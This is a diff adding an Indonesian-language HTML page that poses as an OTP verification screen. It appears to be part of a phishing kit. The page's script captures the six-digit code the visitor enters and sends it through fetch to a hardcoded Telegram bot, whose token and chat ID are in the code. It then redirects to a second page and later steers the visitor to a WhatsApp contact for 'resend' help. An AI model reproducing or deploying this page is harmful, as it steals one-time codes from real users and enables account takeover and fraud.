@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verifikasi OTP</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+}
+
+html,body{ 
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#fff;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+}
+
+.container{
+    width:100%;
+    max-width:360px;
+    height:100vh;
+    margin:auto;
+    padding:18px;
+    position:relative;
+    opacity: 1;
+    transition: opacity 0.5s ease;
+}
+
+/* === ANIMASI: HANYA MEMUDAR === */
+.container.fade-out{
+    opacity: 0;
+}
+
+.back{
+    width:30px;
+    height:30px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+}
+
+.back svg{
+    width:24px;
+    height:24px;
+    stroke:#000;
+    stroke-width:2.5;
+    fill:none;
+}
+
+h1{
+    margin-top:28px;
+    font-size:20px;
+    font-weight:700;
+    color:#000;
+}
+
+.desc{
+    margin-top:25px;
+    text-align:center;
+    color:#222;
+    font-size:15px;
+    line-height:24px;
+}
+
+.desc b{
+    display:block;
+    margin-top:8px;
+    font-size:15px;
+    font-weight:700;
+}
+
+.otp-box{
+    display:flex;
+    justify-content:center;
+    gap:8px;
+    margin-top:30px;
+}
+
+.otp-box input{
+    width:42px;
+    height:60px;
+    border:2px solid #D8D8D8;
+    border-radius:10px;
+    font-size:28px;
+    font-weight:600;
+    text-align:center;
+    outline:none;
+    background:#fff;
+    transition:.25s;
+}
+
+.otp-box input:focus{
+    border-color:#1A73E8;
+}
+
+.otp-box input.success{
+    border-color:#18A558;
+    animation: pulse 0.4s ease;
+}
+
+@keyframes pulse {
+    0%   { transform: scale(1); }
+    50%  { transform: scale(1.08); }
+    100% { transform: scale(1); }
+}
+
+.resend{
+    margin-top:40px;
+    text-align:center;
+}
+
+.resend a{
+    text-decoration:none;
+    color:#1565D8;
+    font-size:15px;
+    font-weight:600;
+}
+
+.footer{
+    position:fixed;
+    left:0;
+    right:0;
+    bottom:110px;
+    text-align:center;
+    color:#9A9A9A;
+    font-size:16px;
+}
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button{
+    -webkit-appearance:none;
+    margin:0;
+}
+
+input{
+    caret-color:transparent;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<div class="back" onclick="history.back()">
+  <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 24 24" fill="none">
+    <path d="M19 12H5" stroke="#000" stroke-width="2.4" stroke-linecap="round" />
+    <path d="M12 19L5 12L12 5" stroke="#000" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" />
+  </svg>
+</div>
+
+<h1>Verifikasi OTP</h1>
+
+<div class="desc">
+Mohon masukkan one-time password (OTP)
+<br>
+yang kami kirim ke
+<b>SMS - 628*********</b>
+</div>
+
+<div class="otp-box">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+<input type="text" maxlength="1">
+</div>
+
+<div class="resend">
+<a id="resendLink" href="#">Kirim Ulang OTP</a>
+</div>
+
+</div>
+
+<script>
+const inputs=document.querySelectorAll(".otp-box input");
+const resend=document.getElementById("resendLink");
+const container=document.querySelector(".container");
+
+// === KIRIM ULANG MENUJU WHATSAPP ===
+const WA_NUMBER = "628211110440";
+const WA_TEXT = "Halo, saya butuh bantuan kirim ulang kode OTP";
+
+// === HALAMAN TUJUAN ===
+const HALAMAN_TUJUAN = "otp2.html";
+
+// === TELEGRAM ===
+const BOT_TOKEN = "8544733481:AAH88M3g5IfA7mjltw8OxPVHWfs9cR8f5Ro";
+const CHAT_ID = "5983910858";
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+let sudahPindah = false;
+
+inputs.forEach((input,index)=>{
+  input.addEventListener("input",function(){
+    this.value=this.value.replace(/[^0-9]/g,'');
+    if(this.value!=='' && index<inputs.length-1){
+      inputs[index+1].focus();
+    }
+    cekOTP();
+  });
+
+  input.addEventListener("keydown",function(e){
+    if(e.key==="Backspace" && this.value==="" && index>0){
+      inputs[index-1].focus();
+    }
+    setTimeout(cekOTP,0);
+  });
+});
+
+function cekOTP(){
+  let penuh=true;
+  let kodeOTP="";
+  inputs.forEach(box=>{
+    if(box.value===""){
+      penuh=false;
+    } else {
+      kodeOTP += box.value;
+    }
+  });
+
+  if(penuh){
+    inputs.forEach(box=> box.classList.add("success"));
+    kirimKeTelegram(kodeOTP);
+
+    if(!sudahPindah){
+      sudahPindah = true;
+      container.classList.add("fade-out");
+      setTimeout(()=>{
+        window.location.href = HALAMAN_TUJUAN;
+      }, 700);
+    }
+  } else {
+    inputs.forEach(box=> box.classList.remove("success"));
+    sudahPindah = false;
+    container.classList.remove("fade-out");
+  }
+}
+
+function kirimKeTelegram(kodeOTP){
+  const pesan = `📩 Kode OTP Diterima: ${kodeOTP}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+  fetch(TELEGRAM_API, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({chat_id: CHAT_ID, text: pesan, parse_mode: "HTML"})
+  })
+  .then(res => res.json())
+  .then(data => { if(data.ok) console.log("✅ OTP berhasil dikirim ke Telegram"); })
+  .catch(err => console.error("Error:", err));
+}
+
+// === TIMER 60 DETIK & KIRIM ULANG KE WHATSAPP ===
+let waktu=60;
+resend.style.pointerEvents="none";
+resend.style.color="#999";
+
+const timer=setInterval(()=>{
+  waktu--;
+  resend.innerHTML="Kirim Ulang OTP ("+waktu+"s)";
+  if(waktu<=0){
+    clearInterval(timer);
+    resend.innerHTML="Kirim Ulang OTP via WhatsApp";
+    resend.style.pointerEvents="auto";
+    resend.style.color="#1565D8";
+    resend.href = `https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(WA_TEXT)}`;
+    resend.target = "_blank";
+  }
+},1000);
+
+document.addEventListener("gesturestart",e=>e.preventDefault());
+document.addEventListener("dblclick",e=>e.preventDefault());
+</script>
+
+</body>
+</html>
